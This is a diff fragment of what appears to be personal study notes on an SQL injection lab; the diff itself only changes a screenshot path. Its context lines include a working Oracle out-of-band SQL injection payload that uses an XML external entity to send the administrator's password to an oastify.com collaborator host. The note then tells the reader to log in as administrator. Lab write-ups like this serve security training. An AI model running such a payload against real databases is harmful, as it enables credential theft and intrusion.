@@ -12,7 +12,7 @@ tags:
 ' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.3898nkw2hx95f6tpasb0pf57ryxplh96.oastify.com/"> %remote;]>'),'/l') FROM dual--
 ```
 
-![[attachments/sqli-lab-17/file-20260204143331287.png]]
+![[attachments/sqli-lab-17/file-20260206135416468.png]]
 
 2. Log in as the administrator to solve the lab
 
